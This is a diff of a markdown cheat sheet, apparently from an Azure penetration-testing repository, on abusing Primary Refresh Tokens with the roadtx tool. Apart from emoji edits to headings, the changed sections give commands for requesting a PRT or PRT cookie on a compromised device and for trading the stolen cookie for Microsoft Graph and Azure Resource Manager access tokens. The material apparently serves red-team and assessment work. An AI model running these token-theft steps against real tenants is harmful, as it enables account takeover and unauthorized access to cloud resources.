@@ -49,7 +49,7 @@ roadtx -h
 <a id='prt'></a>
 ##  💻 Primary Refresh Token (PRT)
 
-### PRT via device enrollement
+### 📲 PRT via device enrollement
 
 On the compromised device, request a new PRT as follows:
 
@@ -83,21 +83,21 @@ roadtx prtauth -c azcli -r msgraph
 roadtx prtauth -c azcli -r azrm     
 ```
 
-### PRT cookie
+### 🍪 PRT cookie
 
-On the compromised device, request a new PRT cookie as follows (the cookie is returned in the `x-ms-DeviceCredential` value):
+On the compromised device, request a new PRT cookie using [request_prt_cookie.py](https://github.com/emiliensocchi/azure-hunting/blob/main/Tools/roadtools/request_prt_cookie.py), and extract the value of the `x-ms-DeviceCredential` parameter:
 ```
 python .\request_prt_cookie.py
 ```
 
 #### Request a refresh and access token for MS Graph using the PRT cookie
 ```
-roadtx gettokens --prt-cookie <stolen_token> -c azcli -r msgraph
+roadtx gettokens --prt-cookie <stolen_cookie> -c azcli -r msgraph
 ```
 
 #### Request a refresh and access token for ARM using the PRT cookie
 ```
-roadtx gettokens --prt-cookie <stolen_token> -c azcli -r azrm
+roadtx gettokens --prt-cookie <stolen_cookie> -c azcli -r azrm
 ```
 
 
